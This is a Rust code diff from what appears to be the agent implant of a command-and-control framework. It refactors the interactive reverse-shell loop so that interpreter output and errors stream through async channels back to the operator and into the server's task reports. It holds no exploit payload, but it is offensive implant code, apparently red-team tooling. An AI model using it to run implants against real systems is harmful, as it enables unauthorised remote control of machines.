@@ -3,17 +3,17 @@ use crossterm::{QueueableCommand, cursor, terminal};
 use eldritch::agent::agent::Agent;
 use eldritch::assets::std::EmptyAssets;
 use eldritch::repl::{Repl, ReplAction};
-use eldritch::{Interpreter, Printer, Span, Value};
+use eldritch::{Interpreter, Value};
 use pb::c2::{
     ReportTaskOutputRequest, ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse,
     TaskContext, TaskError, TaskOutput,
 };
-use std::fmt;
 use std::io::{BufWriter, Write};
 use std::sync::Arc;
 use transport::Transport;
 
 use crate::agent::ImixAgent;
+use crate::printer::StreamPrinter;
 use crate::shell::parser::InputParser;
 use crate::shell::terminal::{VtWriter, render};
 
@@ -59,11 +59,90 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
     output_tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
     agent: ImixAgent<T>,
 ) {
+    let runtime = tokio::runtime::Handle::current();
     let _ = tokio::task::spawn_blocking(move || {
-        let printer = Arc::new(ShellPrinter {
-            tx: output_tx.clone(),
-            agent: agent.clone(),
-            task_context: task_context.clone(),
+        let (out_tx, mut out_rx) = tokio::sync::mpsc::unbounded_channel();
+        let (err_tx, mut err_rx) = tokio::sync::mpsc::unbounded_channel();
+        let printer = Arc::new(StreamPrinter::new(out_tx, err_tx));
+
+        let consumer_output_tx = output_tx.clone();
+        let consumer_agent = agent.clone();
+        let consumer_context = task_context.clone();
+
+        runtime.spawn(async move {
+            let mut out_open = true;
+            let mut err_open = true;
+
+            loop {
+                tokio::select! {
+                    val = out_rx.recv(), if out_open => {
+                        match val {
+                            Some(msg) => {
+                                // Send to REPL
+                                let s_crlf = msg.replace('\n', "\r\n");
+                                let _ = consumer_output_tx
+                                    .send(ReverseShellRequest {
+                                        context: Some(consumer_context.clone()),
+                                        kind: ReverseShellMessageKind::Data.into(),
+                                        data: s_crlf.into_bytes(),
+                                    })
+                                    .await;
+
+                                // Report Task Output
+                                let _ = consumer_agent.report_task_output(ReportTaskOutputRequest {
+                                    output: Some(TaskOutput {
+                                        id: consumer_context.task_id,
+                                        output: msg,
+                                        error: None,
+                                        exec_started_at: None,
+                                        exec_finished_at: None,
+                                    }),
+                                    context: Some(consumer_context.clone()),
+                                    shell_task_output: None,
+                                });
+                            }
+                            None => {
+                                out_open = false;
+                            }
+                        }
+                    }
+                    val = err_rx.recv(), if err_open => {
+                         match val {
+                            Some(msg) => {
+                                // Send to REPL
+                                let s_crlf = msg.replace('\n', "\r\n");
+                                let _ = consumer_output_tx
+                                    .send(ReverseShellRequest {
+                                        context: Some(consumer_context.clone()),
+                                        kind: ReverseShellMessageKind::Data.into(),
+                                        data: s_crlf.into_bytes(),
+                                    })
+                                    .await;
+
+                                // Report Task Output
+                                let _ = consumer_agent.report_task_output(ReportTaskOutputRequest {
+                                    output: Some(TaskOutput {
+                                        id: consumer_context.task_id,
+                                        output: String::new(),
+                                        error: Some(TaskError { msg }),
+                                        exec_started_at: None,
+                                        exec_finished_at: None,
+                                    }),
+                                    context: Some(consumer_context.clone()),
+                                    shell_task_output: None,
+                                });
+                            }
+                            None => {
+                                err_open = false;
+                            }
+                        }
+                    }
+                }
+
+                if !out_open && !err_open {
+                    break;
+                }
+            }
         });
 
         let backend = Arc::new(EmptyAssets {});
@@ -179,68 +258,4 @@ async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
         }
     })
     .await;
-}
-
-struct ShellPrinter<T: Transport> {
-    tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
-    task_context: TaskContext,
-    agent: ImixAgent<T>,
-}
-
-impl<T: Transport + Send + Sync> fmt::Debug for ShellPrinter<T> {
-    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
-        f.debug_struct("ShellPrinter")
-            .field("task_id", &self.task_context.task_id)
-            .finish()
-    }
-}
-
-impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
-    fn print_out(&self, _span: &Span, s: &str) {
-        // Send to REPL
-        let s_crlf = s.replace('\n', "\r\n");
-        let display_s = format!("{s_crlf}\r\n");
-        let _ = self.tx.blocking_send(ReverseShellRequest {
-            context: Some(self.task_context.clone()),
-            kind: ReverseShellMessageKind::Data.into(),
-            data: display_s.into_bytes(),
-        });
-
-        // Report Task Output
-        let req = ReportTaskOutputRequest {
-            output: Some(TaskOutput {
-                id: self.task_context.clone().task_id,
-                output: format!("{s}\n"),
-                error: None,
-                exec_started_at: None,
-                exec_finished_at: None,
-            }),
-            context: Some(self.task_context.clone()),
-        };
-        let _ = self.agent.report_task_output(req);
-    }
-
-    fn print_err(&self, _span: &Span, s: &str) {
-        let s_crlf = s.replace('\n', "\r\n");
-        let display_s = format!("{s_crlf}\r\n");
-        let _ = self.tx.blocking_send(ReverseShellRequest {
-            context: Some(self.task_context.clone()),
-            kind: ReverseShellMessageKind::Data.into(),
-            data: display_s.into_bytes(),
-        });
-
-        let req = ReportTaskOutputRequest {
-            output: Some(TaskOutput {
-                id: self.task_context.clone().task_id,
-                output: String::new(),
-                error: Some(TaskError {
-                    msg: format!("{s}\n"),
-                }),
-                exec_started_at: None,
-                exec_finished_at: None,
-            }),
-            context: Some(self.task_context.clone()),
-        };
-        let _ = self.agent.report_task_output(req);
-    }
 }
